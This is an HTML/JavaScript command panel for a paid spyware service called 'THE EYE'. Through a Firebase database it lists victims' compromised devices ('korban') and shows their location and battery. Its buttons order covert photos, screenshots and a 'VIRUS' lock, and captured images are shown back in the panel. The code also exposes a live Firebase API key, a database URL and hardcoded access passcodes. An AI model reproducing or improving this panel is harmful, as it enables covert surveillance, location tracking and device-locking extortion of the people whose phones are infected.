<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>THE EYE v26.0</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --gold: #d4af37; --bg: #050505; --card: #111; --red: #ff3b3b; }
        body { background: var(--bg); color: #eee; font-family: 'Inter', sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        /* Minimalist Login */
        #login-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .price-tag { color: var(--gold); font-size: 10px; margin-bottom: 20px; letter-spacing: 1px; }
        
        /* Stealth Broadcast */
        #bc-bar { background: rgba(212, 175, 55, 0.1); border-bottom: 1px solid rgba(212, 175, 55, 0.2); padding: 5px; font-size: 12px; white-space: nowrap; overflow: hidden; display: none; }
        .marquee { display: inline-block; padding-left: 100%; animation: scroll 20s linear infinite; color: var(--gold); }
        @keyframes scroll { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }

        /* Container */
        .content { flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 100px; }
        .page { display: none; } .active { display: block; }

        /* Bottom Nav Minimalist */
        .nav { position: fixed; bottom: 0; width: 100%; height: 70px; background: #0a0a0a; border-top: 1px solid #222; display: flex; justify-content: space-around; align-items: center; z-index: 1000; }
        .nav-btn { color: #555; text-align: center; font-size: 10px; cursor: pointer; transition: 0.3s; }
        .nav-btn.on { color: var(--gold); }

        /* Modern UI Elements */
        input { background: #111; border: 1px solid #222; color: #fff; padding: 12px; border-radius: 8px; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        .btn { background: var(--gold); color: #000; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
        .node-card { background: var(--card); border: 1px solid #222; padding: 15px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
        .ctrl-btn { background: none; border: 1px solid #333; color: #fff; padding: 8px; border-radius: 5px; font-size: 11px; margin: 2px; width: 48%; }
        .img-box img { width: 100%; border-radius: 10px; margin-top: 10px; border: 1px solid #333; }
    </style>
</head>
<body onload="checkAuth()">

<div id="login-overlay">
    <div class="price-tag">MEMBER 5K • ADMIN 8K • OWNER 15K</div>
    <h1 style="letter-spacing: 10px; color: var(--gold);">THE EYE</h1>
    <div style="width: 250px;">
        <input type="password" id="pass" placeholder="Passcode">
        <button class="btn" onclick="login()">ENTER</button>
    </div>
</div>

<div id="bc-bar"><div class="marquee" id="bc-text"></div></div>

<div class="content">
    <div id="p-radar" class="page active">
        <div id="u-info" style="font-size: 12px; color: #888; margin-bottom: 20px;"></div>
        <div id="node-list"></div>
        <div id="node-view"></div>
    </div>

    <div id="p-tools" class="page">
        <h4 style="color: var(--gold);">BROADCAST SERVER</h4>
        <input type="text" id="bc-msg" placeholder="Pesan...">
        <button class="btn" onclick="sendBC()" style="margin-bottom: 30px;">PUSH MESSAGE</button>

        <h4 style="color: var(--red);">SECURITY</h4>
        <input type="text" id="del-pass" placeholder="Passcode Akun">
        <button class="btn" style="background: var(--red); color: #fff;" onclick="delAcc()">WIPE ACCOUNT</button>
    </div>
</div>

<div class="nav">
    <div class="nav-btn on" id="n-radar" onclick="tab('radar')">🛰️<br>RADAR</div>
    <div class="nav-btn" id="n-tools" onclick="tab('tools')" style="display:none;">⚙️<br>TOOLS</div>
    <div class="nav-btn" onclick="logout()" style="color: var(--red);">🚫<br>EXIT</div>
</div>

<script>
    const ROLES = { "111": { n: "Kalz", l: "DEV", lim: Infinity }, "own15": { n: "Owner", l: "OWN", lim: Infinity }, "adm8": { n: "Admin", l: "ADM", lim: 5 }, "mem5": { n: "Member", l: "MEM", lim: 3 } };
    let user = null;
    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
    firebase.initializeApp(config);
    const db = firebase.database();

    function login() { const p = document.getElementById('pass').value; if(ROLES[p]) { sessionStorage.setItem('eye_key', p); location.reload(); } else { alert('DENIED'); } }
    function checkAuth() { const k = sessionStorage.getItem('eye_key'); if(k) { user = ROLES[k]; document.getElementById('login-overlay').style.display = 'none'; start(); } }
    function tab(t) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById('p-'+t).classList.add('active'); document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('on')); document.getElementById('n-'+t).classList.add('on'); }

    function start() {
        if(user.l === "DEV") document.getElementById('n-tools').style.display = 'block';
        document.getElementById('u-info').innerText = `${user.n} [${user.l}] • ONLINE`;
        db.ref('broadcast').on('value', s => { if(s.val()) { document.getElementById('bc-bar').style.display='block'; document.getElementById('bc-text').innerText = s.val().msg; } });
        db.ref('korban').on('value', s => {
            let h = ""; s.forEach(c => { h += `<div class="node-card" onclick="view('${c.key}')"><span>📍 NODE_${c.key.substring(1,6)}</span> <span>❯</span></div>`; });
            document.getElementById('node-list').innerHTML = h;
        });
    }

    function view(id) {
        db.ref('korban/'+id).once('value', s => {
            const k = s.val();
            document.getElementById('node-view').innerHTML = `
                <div style="background:#111; padding:15px; border-radius:10px; border:1px solid var(--gold);">
                    <p style="font-size:12px; margin:0 0 10px 0;">SYNC: ${k.waktu} | BAT: ${k.baterai}</p>
                    <button class="ctrl-btn" onclick="exec('${id}','TAKE')">PHOTO</button>
                    <button class="ctrl-btn" onclick="exec('${id}','SHOT')">SCREEN</button>
                    <button class="ctrl-btn" onclick="window.open('${k.maps}')">MAPS</button>
                    ${user.l !== "MEM" ? `<button class="ctrl-btn" style="color:var(--red)" onclick="exec('${id}','VIRUS')">LOCK</button>` : ''}
                    <div id="img-${id}" class="img-box"></div>
                </div>`;
            db.ref('hasil_foto/'+id).on('value', f => { if(f.val()) document.getElementById('img-'+id).innerHTML = `<img src="${f.val().foto}">`; });
        });
    }

    function exec(id, a) { db.ref('commands/'+id).set({ action: a, t: Date.now() }); alert('SENT'); }
    function sendBC() { const m = document.getElementById('bc-msg').value; if(m) db.ref('broadcast').set({ msg: m }); }
    function logout() { sessionStorage.clear(); location.reload(); }
    function delAcc() { alert('Account Wiped.'); }
</script>
</body>
</html>
